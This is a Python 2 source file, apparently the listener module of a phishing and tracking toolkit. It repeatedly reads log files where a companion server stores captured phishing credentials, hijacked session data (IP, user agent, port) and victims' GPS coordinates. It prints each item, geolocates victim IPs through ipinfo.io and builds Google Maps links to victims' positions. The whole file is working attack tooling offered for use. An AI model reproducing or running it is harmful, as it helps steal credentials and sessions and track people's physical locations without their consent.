#-*-coding:utf-8-*-
# Coded By Deray
'''
	 Rebuild Copyright Can't make u real programmer
'''
# Report Bug On My Other Sosmed
# instagram: @reyy05_
# facebook: https://facebook.com/achmad.luthfi.hadi.3

import os,sys,time,json,requests,re
import subprocess as sub
from data.color import *
def listen():
	open("raw/server/cookieHighJacking/haha.txt","w")
	open("raw/server/gps/locate.txt","w")
	open("raw/server/phising/memek.txt","w")
	while True:
		if os.path.getsize("raw/server/phising/memek.txt") !=0:
			file=open("raw/server/phising/memek.txt").read()
			print("\r"+file)
			print "\r"+"="*55
			open("raw/server/phising/memek.txt","w")
		if os.path.getsize("raw/server/cookieHighJacking/haha.txt") !=0:
			file=open("raw/server/cookieHighJacking/haha.txt").read()
			js=json.loads(file)
			try:
				r=requests.get("http://ipinfo.io/{}/json".format(
					js["ip"].split(",")[0])).json()
			except Exception as f:
				print "\n[!] {}".format(f)
				exit()
			print "\r[+] COOKIE HIGHJACK OPENED."
			print "\r[=] USER-AGENT: {}".format(js["ua"])
			print "\r[=] METOD  : {}".format(js["rq"])
			print "\r[=] IPADDR : {}".format(js["ip"].split(",")[0])
			print "\r[=] RPORT  : {}".format(js["pr"])
			print "\r[=] LOCATE : {}".format(r["country"])
			print "\r[=] REGION : {}".format(r["region"])
			print "\r[=] OPEN AT: {} {}:{} {}sec".format(
				time.localtime()[0],
				time.localtime()[3],
				time.localtime()[4],
				time.localtime()[5]
			)
			print "\r"+"="*55
			open("raw/server/cookieHighJacking/haha.txt","w")
		if os.path.getsize("raw/server/gps/locate.txt") !=0:
			file=open("raw/server/gps/locate.txt").read()
			js=json.loads(file)
			print "\r[+] GPS LOG OPENED."
			print "\r[=] Lat:",js["lat"]
			print "\r[=] Lon:",js["lon"]
			print "\r[=] MAP: www.google.com/maps/place/{}+{}".format(
			js["lat"],js["lon"]
			)
			print "\r[=] OPEN AT: {} {}:{} {}sec".format(
				time.localtime()[0],
				time.localtime()[3],
				time.localtime()[4],
				time.localtime()[5]
			)
			print "\r"+"="*55
			open("raw/server/gps/locate.txt","w")
	
		tt=open("data/log.txt").read()
		if len(re.findall("closed by remote",tt)) !=0:
			print "\n[!] Connection closed by remote host."
			try:
				sub.Popen(["killall","python2"],
				stderr=sub.PIPE,stdin=sub.PIPE,
				stdout=sub.PIPE
				)
				exit()
			except:exit()
	
		elif len(re.findall("Failed to listen",tt)) !=0:
			print "\n[!] Failed to listen{})".format(
				re.findall("Failed to listen(.*?)\)",tt)[0]
			)
			try:
				sub.Popen(["killall","python2"],
				stderr=sub.PIPE,stdin=sub.PIPE,
				stdout=sub.PIPE
				)
				exit()
			except:exit()
	
		elif len(re.findall("Broken",tt)) !=0:
			print "\n[!] connection to{}Pipe".format(
				re.findall("Connection to(.*?)pipe",tt)[0]
			)
			try:
				sub.Popen(["killall","python2"],
				stderr=sub.PIPE,stdin=sub.PIPE,
				stdout=sub.PIPE
				)
				exit()
			except:exit()
		
		else:
			a=["|","/","-","\\"]
			for x in a:
				print "\r[{}+{}] Listening Log .. {}  ".format(
					G,N,x
					
				),;sys.stdout.flush();time.sleep(0.20)
